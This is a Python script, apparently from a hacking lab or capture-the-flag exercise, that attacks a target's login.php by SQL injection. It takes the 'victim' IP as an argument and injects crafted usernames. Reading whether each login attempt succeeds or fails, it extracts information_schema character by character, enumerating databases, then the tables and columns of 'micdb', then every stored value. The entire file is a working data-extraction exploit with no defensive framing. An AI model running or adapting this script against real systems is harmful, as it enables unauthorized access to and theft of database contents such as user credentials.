import sys
import requests
import time

if len(sys.argv) == 2:
    ip_vittima = sys.argv[1]
else:
    print("Inserire ip della vittima come parametro:")
    print("$ python3 sql_injection_login.py <IP_VITTIMA>")
    exit(-1)

url = f"http://{ip_vittima}/login.php"

def send_payload(payload):
    #print(payload)
    data = {
        "username": payload,
        "password": "ciao"
    }
    start_time = time.time()
    try:
        response = requests.post(url, data=data)
        if "Username or password incorrect, try again." in response.text or "illegal format" in response.text:
            return -1

        return time.time() - start_time
    except requests.exceptions.RequestException as e:
        print(f"An error occured: {e}")
        return -1

def is_correct_char(payload, threshold=0):
    return send_payload(payload) >= threshold

def extract_values(query_func):
    values = []
    offset = 0

    start_char = 32
    end_char = 127

    while True:
        value = ""
        found_char = True

        while found_char:
            found_char = False
            for j in range(start_char, end_char):
                if j in [37, 61]:  # 37=%, 61==
                    continue

                char_to_test = chr(j)
                if char_to_test == "_":
                    char_to_test = "\\_"

                payload = query_func(value, offset, char_to_test)

                if is_correct_char(payload):
                    value += chr(j)
                    found_char = True
                    break

        if value != "":
            values.append(value)
            print(f"Found value: {value}")
            offset += 1
        else:
            break

    return values

def extract_databases():
    print("\nEctracting databases")

    def query(value, offset, char):
        return f"' OR (SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {offset} ) LIKE BINARY '{value}{char}%' LIMIT 1; #"
    return extract_values(query)

def extract_tables(db):
    print(f"\nEctracting tables of {db}")

    def query(value, offset, char):
        return f"' OR (SELECT table_name FROM information_schema.tables WHERE table_schema LIKE '{db}' LIMIT 1 OFFSET {offset}) LIKE BINARY '{value}{char}%' ESCAPE '\\\\' LIMIT 1; #"

    return extract_values(query)

def extract_columns(db, table):
    print(f"\nExtracting columns of table: {table} (Database: {db})")

    def query(value, offset, char):
        return f"' OR (SELECT column_name FROM information_schema.columns WHERE table_schema LIKE '{db}' AND table_name LIKE '{table}' LIMIT 1 OFFSET {offset}) LIKE BINARY '{value}{char}%' ESCAPE '\\\\' LIMIT 1;# "
    return extract_values(query)

def extract_column_values(db, table, column):
    print(f"\nExtracting values from column: {column} ({db}.{table})")

    def query(value, offset, char):
        return f"' OR (SELECT {column} FROM {db}.{table} LIMIT 1 OFFSET {offset}) LIKE BINARY '{value}{char}%' LIMIT 1; # "
    return extract_values(query)

databases = extract_databases()
print(databases)

db = "micdb"
tables = extract_tables(db)

for table in tables:
    columns = extract_columns(db, table)
    for column in columns:
        print(table)
        print(column)
        column_values = extract_column_values(db, table, column)
        print(column_values)


